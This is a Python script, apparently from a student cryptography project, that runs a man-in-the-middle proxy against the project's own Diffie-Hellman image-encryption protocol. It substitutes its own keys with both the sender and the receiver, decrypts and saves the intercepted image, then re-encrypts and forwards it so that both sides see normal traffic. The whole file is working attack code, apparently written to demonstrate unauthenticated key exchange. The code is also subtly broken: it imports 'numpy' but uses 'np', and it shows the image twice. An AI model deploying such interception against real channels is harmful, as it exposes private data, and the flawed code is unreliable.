import socket
import sys
import threading
import io
import os
import time
from pathlib import Path
from PIL import Image
import numpy

# ---------------------------------------------------------------------------
# Ajuste o sys.path da mesma forma que emissor.py e receptor.py fazem,
# para que os imports do projeto funcionem ao rodar direto da raiz.
# ---------------------------------------------------------------------------
diretorio_atual = os.path.dirname(os.path.abspath(__file__))
raiz_projeto = os.path.abspath(os.path.join(diretorio_atual, "..", ".."))
if raiz_projeto not in sys.path:
    sys.path.insert(0, raiz_projeto)

from diffie_hellman import dh
from matrizes_operations.util import *
from matrizes_operations.arnold_melhorado import *
from matrizes_operations.difusao import *

# ---------------------------------------------------------------------------
# Uso: python mitm.py <ip_receptor_real> <porta_entrada> <porta_saida>
#
#   <ip_receptor_real>  IP onde o receptor real está ouvindo
#   <porta_entrada>     Porta que o MITM abre para o emissor se conectar
#   <porta_saida>       Porta do receptor real onde o MITM se conecta
#
# Fluxo de rede:
#   Emissor  →  MITM:<porta_entrada>  →  Receptor real:<porta_saida>
# ---------------------------------------------------------------------------

if len(sys.argv) < 4:
    print("Uso:    python mitm.py <ip_receptor_real> <porta_entrada> <porta_saida>")
    print("Exemplo: python mitm.py 127.0.0.1 4444 1234")
    sys.exit(1)

IP_RECEPTOR_REAL = sys.argv[1]
PORTA_ENTRADA    = int(sys.argv[2])   # emissor vai se conectar aqui
PORTA_SAIDA      = int(sys.argv[3])   # receptor real está escutando aqui

PASTA_SAIDA = Path("mitm_interceptado")
PASTA_SAIDA.mkdir(exist_ok=True)


# ---------------------------------------------------------------------------
# Helpers de mensagem (mesmo protocolo de emissor/receptor)
# ---------------------------------------------------------------------------

def receber_mensagem(sock: socket.socket) -> str:
    """Recebe uma mensagem delimitada por newline '\\n'."""
    dados = b""
    while not dados.endswith(b"\n"):
        byte = sock.recv(1)
        if not byte:
            break
        dados += byte
    return dados.decode("utf-8").strip()


def enviar_mensagem(sock: socket.socket, msg) -> None:
    """Envia uma mensagem delimitada por newline '\\n'."""
    sock.sendall((str(msg) + "\n").encode("utf-8"))


def receber_bytes_completos(sock: socket.socket, total: int) -> bytes:
    """Lê exatamente `total` bytes do socket."""
    dados = b""
    while len(dados) < total:
        restante = total - len(dados)
        pedaco = sock.recv(min(4096, restante))
        if not pedaco:
            break
        dados += pedaco
    return dados


# ---------------------------------------------------------------------------
# Lógica principal do ataque MITM
# ---------------------------------------------------------------------------

def realizar_ataque(sock_emissor: socket.socket, endereco_emissor):
    """
    Executa o ataque MITM completo para uma conexão de emissor.
    Abre uma conexão paralela com o receptor real.
    """
    sock_receptor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print(f"\n{'='*60}")
        print(f"[MITM] Nova conexão de {endereco_emissor}")
        print(f"[MITM] Conectando ao receptor real {IP_RECEPTOR_REAL}:{PORTA_SAIDA}...")
        sock_receptor.connect((IP_RECEPTOR_REAL, PORTA_SAIDA))
        print(f"[MITM] Conectado ao receptor real.")

        # ---------------------------------------------------------------
        # PASSO 1 — Recebe a chave pública do receptor REAL
        # ---------------------------------------------------------------
        chave_publica_receptor_real = int(receber_mensagem(sock_receptor))
        print(f"[MITM] Chave pública do receptor real recebida: {chave_publica_receptor_real}")

        # ---------------------------------------------------------------
        # PASSO 2 — Gera par de chaves MITM lado-receptor
        #           (para se passar de emissor perante o receptor real)
        # ---------------------------------------------------------------
        chave_privada_para_receptor = dh.gerar_chave_privada()
        chave_publica_para_receptor = dh.calcular_chave_publica(chave_privada_para_receptor)

        # ---------------------------------------------------------------
        # PASSO 3 — Envia ao receptor real a chave pública MITM
        #           (receptor acredita que é o emissor legítimo)
        # ---------------------------------------------------------------
        enviar_mensagem(sock_receptor, chave_publica_para_receptor)
        print(f"[MITM] Chave pública MITM enviada ao receptor real: {chave_publica_para_receptor}")

        # Calcula segredo compartilhado com o receptor real
        segredo_com_receptor = dh.calcular_segredo_compartilhado(
            chave_privada_para_receptor, chave_publica_receptor_real
        )
        print(f"[MITM] Segredo compartilhado com receptor real estabelecido.")

        # ---------------------------------------------------------------
        # PASSO 4 — Gera par de chaves MITM lado-emissor
        #           (para se passar de receptor perante o emissor)
        # ---------------------------------------------------------------
        chave_privada_para_emissor = dh.gerar_chave_privada()
        chave_publica_para_emissor = dh.calcular_chave_publica(chave_privada_para_emissor)

        # ---------------------------------------------------------------
        # PASSO 5 — Envia ao emissor a chave pública MITM
        #           (emissor acredita que é o receptor legítimo)
        # ---------------------------------------------------------------
        enviar_mensagem(sock_emissor, chave_publica_para_emissor)
        print(f"[MITM] Chave pública MITM enviada ao emissor: {chave_publica_para_emissor}")

        # ---------------------------------------------------------------
        # PASSO 6 — Recebe a chave pública do emissor
        # ---------------------------------------------------------------
        chave_publica_emissor = int(receber_mensagem(sock_emissor))
        print(f"[MITM] Chave pública do emissor recebida: {chave_publica_emissor}")

        # Calcula segredo compartilhado com o emissor
        segredo_com_emissor = dh.calcular_segredo_compartilhado(
            chave_privada_para_emissor, chave_publica_emissor
        )
        print(f"[MITM] Segredo compartilhado com emissor estabelecido.")

        # ---------------------------------------------------------------
        # PASSO 7 — Recebe tamanho da imagem cifrada do emissor
        # ---------------------------------------------------------------
        tamanho_imagem = int(receber_mensagem(sock_emissor))
        print(f"[MITM] Tamanho da imagem anunciado pelo emissor: {tamanho_imagem} bytes")

        # ---------------------------------------------------------------
        # PASSO 8 — Recebe os bytes da imagem cifrada
        # ---------------------------------------------------------------
        print(f"[MITM] Recebendo imagem cifrada...")
        dados_img_cifrada = receber_bytes_completos(sock_emissor, tamanho_imagem)
        print(f"[MITM] Imagem cifrada recebida ({len(dados_img_cifrada)} bytes).")

        # ---------------------------------------------------------------
        # PASSO 9 — DESCRIPTOGRAFA a imagem com o segredo do emissor
        # ---------------------------------------------------------------
        print(f"[MITM] Descriptografando imagem interceptada...")
        img_recebida = Image.open(io.BytesIO(dados_img_cifrada))
        img_array = np.array(img_recebida)

        img_undifundida  = decifrar_com_chave_dh(img_array, segredo_com_emissor)
        img_original_arr = decript_arnold(img_undifundida, segredo_com_emissor)

        img_original = recuperar_imagem(img_original_arr)
        img_original.show()
        timestamp = int(time.time())
        caminho_salvo = PASTA_SAIDA / f"imagem_interceptada_{timestamp}.png"
        img_original.save(caminho_salvo)
        print(f"[MITM] *** IMAGEM INTERCEPTADA SALVA EM: {caminho_salvo} ***")

        # Exibe a imagem interceptada (opcional; remova se não quiser abrir janela)
        img_original.show()

        # ---------------------------------------------------------------
        # PASSO 10 — RE-CRIPTOGRAFA com o segredo do receptor e repassa
        # ---------------------------------------------------------------
        print(f"[MITM] Re-cifrando imagem para o receptor real...")
        img_confundida = arnold_fast(img_original_arr, segredo_com_receptor)
        img_difundida  = cifrar_com_chave_dh(img_confundida, segredo_com_receptor)

        img_para_receptor = recuperar_imagem(img_difundida)
    
        buffer = io.BytesIO()
        img_para_receptor.save(buffer, format='PNG')
        dados_recifrados = buffer.getvalue()

        # Envia tamanho e depois os bytes ao receptor real
        enviar_mensagem(sock_receptor, len(dados_recifrados))
        sock_receptor.sendall(dados_recifrados)
        print(f"[MITM] Imagem re-cifrada enviada ao receptor real ({len(dados_recifrados)} bytes).")
        print(f"[MITM] Ataque concluído com sucesso — comunicação pareceu normal para ambos os lados.")
        print(f"{'='*60}\n")

    except Exception as e:
        print(f"[MITM] Erro durante o ataque: {e}")
        import traceback
        traceback.print_exc()

    finally:
        sock_emissor.close()
        sock_receptor.close()


# ---------------------------------------------------------------------------
# Servidor MITM — aceita conexões do emissor em loop
# ---------------------------------------------------------------------------

def iniciar_servidor_mitm():
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind(("0.0.0.0", PORTA_ENTRADA))
    servidor.listen(5)

    print(f"[MITM] Proxy Man-in-the-Middle iniciado.")
    print(f"[MITM] Escutando emissores em         : 0.0.0.0:{PORTA_ENTRADA}")
    print(f"[MITM] Encaminhando para receptor real : {IP_RECEPTOR_REAL}:{PORTA_SAIDA}")
    print(f"[MITM] Imagens interceptadas salvas em : {PASTA_SAIDA.resolve()}")
    print(f"[MITM] Aguardando conexões...\n")

    try:
        while True:
            sock_cliente, endereco = servidor.accept()
            # Cada conexão é tratada em uma thread separada
            t = threading.Thread(
                target=realizar_ataque,
                args=(sock_cliente, endereco),
                daemon=True
            )
            t.start()
    except KeyboardInterrupt:
        print("\n[MITM] Encerrado pelo usuário.")
    finally:
        servidor.close()


if __name__ == "__main__":
    iniciar_servidor_mitm()